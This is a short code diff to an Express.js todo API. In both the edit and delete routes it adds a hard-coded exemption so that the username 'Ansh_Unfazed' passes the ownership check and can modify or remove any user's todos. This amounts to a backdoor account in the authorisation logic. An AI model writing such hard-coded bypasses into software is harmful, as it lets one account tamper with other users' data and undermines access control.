@@ -120,7 +120,7 @@ router.put('/:id', auth, async (req, res) => {
         const todoToCheck = await Todo.findById(req.params.id);
         if (!todoToCheck) return res.status(404).json({ message: 'Todo not found' });
 
-        if (todoToCheck.author && todoToCheck.author !== req.user.name) {
+        if (todoToCheck.author && todoToCheck.author !== req.user.name && req.user.username !== 'Ansh_Unfazed') {
             return res.status(403).json({ message: 'Not authorized to edit this todo' });
         }
 
@@ -154,7 +154,7 @@ router.delete('/:id', auth, async (req, res) => {
         const todoToCheck = await Todo.findById(req.params.id);
         if (!todoToCheck) return res.status(404).json({ message: 'Todo not found' });
 
-        if (todoToCheck.author && todoToCheck.author !== req.user.name) {
+        if (todoToCheck.author && todoToCheck.author !== req.user.name && req.user.username !== 'Ansh_Unfazed') {
             return res.status(403).json({ message: 'Not authorized to delete this todo' });
         }
 
